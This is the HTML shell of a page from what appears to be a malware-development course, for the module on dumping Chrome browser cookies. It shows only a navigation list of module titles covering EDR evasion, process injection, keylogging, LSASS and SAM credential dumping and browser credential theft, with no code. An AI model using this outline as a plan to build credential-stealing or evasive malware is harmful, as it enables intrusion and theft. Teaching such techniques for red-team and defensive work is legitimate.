                <input type="checkbox" id="module-26" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./26.html">
                    <div for="module-26" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 26 - DLL Sideloading For EDR Evasion
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-27" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./27.html">
                    <div for="module-27" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 27 - Bring Your Own Vulnerable Driver
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-28" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./28.html">
                    <div for="module-28" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 28 - Local PE Injection
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-29" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./29.html">
                    <div for="module-29" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 29 - Reflective DLL Injection
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-30" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./30.html">
                    <div for="module-30" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 30 - PeFluctuation
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-31" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./31.html">
                    <div for="module-31" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 31 - Building a PE Packer
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-32" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./32.html">
                    <div for="module-32" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 32 - Malware Directory Placement
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-33" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./33.html">
                    <div for="module-33" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 33 - Utilizing Fibers For Payload Execution
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-34" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./34.html">
                    <div for="module-34" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 34 - TLS Callbacks For Anti-Debugging
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-35" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./35.html">
                    <div for="module-35" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 35 - Threadless Injection
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-36" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./36.html">
                    <div for="module-36" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 36 - Module Stomping
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-37" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./37.html">
                    <div for="module-37" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 37 - Module Overloading
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-38" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./38.html">
                    <div for="module-38" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 38 - Process Hollowing
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-39" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./39.html">
                    <div for="module-39" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 39 - Ghost Process Injection
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-40" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./40.html">
                    <div for="module-40" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 40 - Ghostly Hollowing
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-41" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./41.html">
                    <div for="module-41" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 41 - Herpaderping Process Injection
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-42" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./42.html">
                    <div for="module-42" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 42 - Herpaderply Hollowing
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-43" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./43.html">
                    <div for="module-43" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 43 - Shellcode Reflective DLL Injection (sRDI)
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-44" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./44.html">
                    <div for="module-44" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 44 - Patchless Threadless Injection Via Hardware BreakPoints
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-45" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./45.html">
                    <div for="module-45" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 45 - Tampered Syscalls Via Hardware BreakPoints
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-46" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./46.html">
                    <div for="module-46" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 46 - Exploiting EDRs For Evasion - Preventing EDR From Taking Action
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-47" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./47.html">
                    <div for="module-47" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 47 - Exploiting EDRs For Evasion - EDR LOLBINS
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-48" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./48.html">
                    <div for="module-48" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 48 - Process Hypnosis
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-49" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./49.html">
                    <div for="module-49" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 49 - Introduction To Object Files
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-50" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./50.html">
                    <div for="module-50" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 50 - Writing Beacon Object Files
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-51" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./51.html">
                    <div for="module-51" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 51 - Object File Loading
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-52" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./52.html">
                    <div for="module-52" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 52 - Exploiting EDRs For Evasion - Finding Internal Exclusion List
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-53" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./53.html">
                    <div for="module-53" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 53 - Introduction To Sleep Obfuscation
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-54" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./54.html">
                    <div for="module-54" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 54 - Introduction to Ekko and Zilean Sleep Obfuscation
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-55" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./55.html">
                    <div for="module-55" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 55 - Introduction to Foliage Sleep Obfuscation
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-56" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./56.html">
                    <div for="module-56" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 56 - Implementing Ekko With Stack Spoofing
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-57" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./57.html">
                    <div for="module-57" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 57 - Token Manipulation
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-58" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./58.html">
                    <div for="module-58" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 58 - Library Proxy Loading
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-59" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./59.html">
                    <div for="module-59" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 59 - Heap Encryption With Ekko Sleep Obfuscation
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-60" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./60.html">
                    <div for="module-60" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 60 - Introduction To Executing .NET Assemblies 
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-61" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./61.html">
                    <div for="module-61" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 61 - Evading Microsoft Defender Via Patching 
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-62" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./62.html">
                    <div for="module-62" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 62 - .NET Assemblies - Patching System.Environment.Exit
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-63" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./63.html">
                    <div for="module-63" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 63 - Capturing And Saving Screenshots Into Memory
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-64" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./64.html">
                    <div for="module-64" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 64 - Cross-Architecture Injection: x86 to x64 Injection
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-65" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./65.html">
                    <div for="module-65" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 65 - KnownDll Cache Poisoning Injection
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-66" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./66.html">
                    <div for="module-66" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 66 - Introduction to Keylogging
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-67" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./67.html">
                    <div for="module-67" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 67 - Developing a Keylogger
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-68" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./68.html">
                    <div for="module-68" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 68 - Sending Keystrokes To Remote Server
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-69" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./69.html">
                    <div for="module-69" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 69 - Manipulating VEH For Local Code Execution 
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-70" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./70.html">
                    <div for="module-70" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 70 - Introduction To LSASS Dumping
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-71" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./71.html">
                    <div for="module-71" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 71 - Fetching LSASS Handle And Bypassing PPL
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-72" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./72.html">
                    <div for="module-72" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 72 - LSASS Dump Via Handle Duplication
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-73" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./73.html">
                    <div for="module-73" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 73 - LSASS Dump Via RtlReportSilentProcessExit
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-74" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./74.html">
                    <div for="module-74" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 74 - LSASS Dump Via Seclogon Race Condition
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-75" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./75.html">
                    <div for="module-75" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 75 - Dumping The SAM Database
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-76" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./76.html">
                    <div for="module-76" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 76 - Dumping The SAM Remotely
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-77" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./77.html">
                    <div for="module-77" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 77 - Dumping The SAM From Disk
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-78" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./78.html">
                    <div for="module-78" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 78 - Domain Enumeration Using MS-SAMR
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-79" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./79.html">
                    <div for="module-79" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 79 - Dumping Browser Cookies: Firefox
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-80" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./80.html">
                    <div for="module-80" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 80 - Dumping Saved Logins: Firefox
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-81" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./81.html">
                    <div for="module-81" class="ml-2 text-sm font-medium 
                                bg-blue-700 font-bold rounded-sm">
                        Module 81 - Dumping Browser Cookies: Chrome
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-82" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./82.html">
                    <div for="module-82" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 82 - Dumping Saved Logins: Chrome
                    </div>
                </a>
            </div>
                </div>
    </div>
</div>          </div>
      </div>

      
      <div class="flex">
  <div class="flex flex-row flex-wrap justify-center items-center w-full bg-gray-700/70 backdrop-blur-md backdrop-saturate-150 border-r border-l border-gray-600/60 pl-4 pt-2 pb-2 rounded-bl-xl rounded-br-xl shadow-inner">

          <div class="mr-2">
        <a data-target="_self" href="./80.html">
          <button class="w-[100px] h-10 px-5 text-sm font-medium text-white
             rounded-xl backdrop-blur-xl backdrop-saturate-150
             bg-gradient-to-b from-blue-600/85 to-blue-700/85
             hover:from-blue-500/85 hover:to-blue-600/85
             border border-blue-300/30 ring-1 ring-inset ring-white/10
             shadow-[0_6px_18px_-8px_rgba(0,0,0,0.7)]
             transition-all duration-200 focus:outline-none
             focus-visible:ring-2 focus-visible:ring-white/30">Previous</button>
        </a>
      </div>
    
    <div class="mr-2">
      <a data-target="_self" href="../All Modules.html">
        <button class="w-[100px] h-10 px-5 text-sm font-medium text-white
             rounded-xl backdrop-blur-xl backdrop-saturate-150
             bg-gradient-to-b from-blue-600/85 to-blue-700/85
             hover:from-blue-500/85 hover:to-blue-600/85
             border border-blue-300/30 ring-1 ring-inset ring-white/10
             shadow-[0_6px_18px_-8px_rgba(0,0,0,0.7)]
             transition-all duration-200 focus:outline-none
             focus-visible:ring-2 focus-visible:ring-white/30">Modules</button>
      </a>
    </div>

    <div class="my-2 mr-2">
      <form id="complete-module" action="./81/complete" method="POST">
      </form>
      <form id="uncomplete-module" action="./8#" method="POST">
      </form>
    </div>

          <div class="mr-2">
        <a data-target="_self" href="./82.html">
          <button class="w-[100px] h-10 px-5 text-sm font-medium text-white
             rounded-xl backdrop-blur-xl backdrop-saturate-150
             bg-gradient-to-b from-blue-600/85 to-blue-700/85
             hover:from-blue-500/85 hover:to-blue-600/85
             border border-blue-300/30 ring-1 ring-inset ring-white/10
             shadow-[0_6px_18px_-8px_rgba(0,0,0,0.7)]
             transition-all duration-200 focus:outline-none
             focus-visible:ring-2 focus-visible:ring-white/30">Next</button>
        </a>
      </div>
    
  </div>
</div>

      
      <input type="hidden" id="objectives-completed" value="20973">

      
      <div id="copyWarning" class="fixed inset-0 hidden z-50 flex items-center justify-center bg-black/70 backdrop-blur-sm">
  <div class="relative bg-gray-800 border border-gray-600 rounded-2xl shadow-2xl p-8 max-w-lg w-11/12 text-center transform transition-all scale-100">
    <p class="text-2xl font-bold text-white mb-4 tracking-wide">
      Reminder
    </p>
    <p class="text-gray-300 text-base mb-6 leading-relaxed">
      To remain compliant with the Terms of Service, avoid copying the entire module and instead copy the necessary sections.
    </p>
    <button onclick="hideCopyWarning()" class="w-full text-white font-medium rounded-lg text-sm px-5 py-2.5 text-center transition-all duration-200 bg-blue-600/80 hover:bg-blue-500/80 border border-blue-400/40 backdrop-blur-sm backdrop-saturate-150">
      I understand
    </button>
    <span class="absolute top-3 right-3 text-gray-400 hover:text-gray-200 cursor-pointer text-xl" onclick="hideCopyWarning()"></span>
  </div>
</div>



      
        </div>

  <footer id="footer" class="text-gray-400
    bg-gradient-to-t from-[#101926] via-[#172130] to-[#1e293b] backdrop-blur-md backdrop-saturate-150 z-20 border-t border-gray-700/50 border-gray-800
     hidden body-font">
    <div class="container px-5 py-8 mx-auto flex items-center sm:flex-row flex-col">
      <p class="text-sm text-gray-400 sm:ml-4 sm:pl-4 sm:border-gray-800 sm:py-2 sm:mt-0 mt-4"> 2025 Maldev Academy Inc.</p>
        <a href="https://x.com/maldevacademy" target="_blank" class="text-gray-500 hover:text-white ml-2 sm:mt-0 mt-4">
          <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 1200 1227" xmlns="http://www.w3.org/2000/svg">
            <path d="M714.163 519.284L1160.89 0H1055.03L667.137 450.887L357.328 0H0L468.492 681.821L0 1226.37H105.866L515.491 750.218L842.672 1226.37H1200L714.137 519.284H714.163ZM569.165 687.828L521.697 619.934L144.011 79.6944H306.615L611.412 515.685L658.88 583.579L1055.08 1150.3H892.476L569.165 687.854V687.828Z" fill="white"></path>
          </svg>            
        </a>
        <a href="https://github.com/Maldev-Academy" target="_blank" class="text-gray-500 hover:text-white ml-2 sm:mt-0 mt-4">
          <svg class="w-6 h-6" fill="white" viewBox="0 0 24 24" aria-hidden="true"><path fill-rule="evenodd" d="M12 2C6.477 2 2 6.484 2 12.017c0 4.425 2.865 8.18 6.839 9.504.5.092.682-.217.682-.483 0-.237-.008-.868-.013-1.703-2.782.605-3.369-1.343-3.369-1.343-.454-1.158-1.11-1.466-1.11-1.466-.908-.62.069-.608.069-.608 1.003.07 1.531 1.032 1.531 1.032.892 1.53 2.341 1.088 2.91.832.092-.647.35-1.088.636-1.338-2.22-.253-4.555-1.113-4.555-4.951 0-1.093.39-1.988 1.029-2.688-.103-.253-.446-1.272.098-2.65 0 0 .84-.27 2.75 1.026A9.564 9.564 0 0112 6.844c.85.004 1.705.115 2.504.337 1.909-1.296 2.747-1.027 2.747-1.027.546 1.379.202 2.398.1 2.651.64.7 1.028 1.595 1.028 2.688 0 3.848-2.339 4.695-4.566 4.943.359.309.678.92.678 1.855 0 1.338-.012 2.419-.012 2.747 0 .268.18.58.688.482A10.019 10.019 0 0022 12.017C22 6.484 17.522 2 12 2z" clip-rule="evenodd"></path></svg>
        </a>
      <span class="inline-flex sm:ml-auto sm:mt-0 mt-4 justify-center sm:justify-start">
        <a class="text-gray-400 text-sm" href="https://maldevacademy.com/tos">
          Terms of Service
      </a></span><a class="text-gray-400 text-sm" href="https://maldevacademy.com/tos">
    </a></div><a class="text-gray-400 text-sm" href="https://maldevacademy.com/tos">
  </a></footer></template>

<div id="app-root">
  
  <div class="fixed bottom-4 right-5 bg-gray-900 text-white text-sm font-bold rounded-xl px-2 py-2 shadow-lg cursor-pointer z-20" onclick="window.scrollTo({ top: 0, behavior: 'smooth' });">
      <img src="81_files/module-up.svg" width="20px" alt="">
  </div>

  <div class="bg-[#101926] p-4">
      
      <div class="flex relative z-10">
    <input type="hidden" value="20973">
    <div class="md:flex-row flex-col flex md:items-center w-1/2 bg-gray-700/70 backdrop-blur-md backdrop-saturate-150 border-l border-t border-gray-600/60 pl-4 pt-2 pb-2 rounded-tl-xl">
        <div>
            Module 81 - Dumping Browser Cookies: Chrome
        </div>
        <div class="ml-2 w-4 h-4 rounded-full shadow-inner bg-rose-500/90 ring-1 ring-rose-400/50"></div>

    </div>
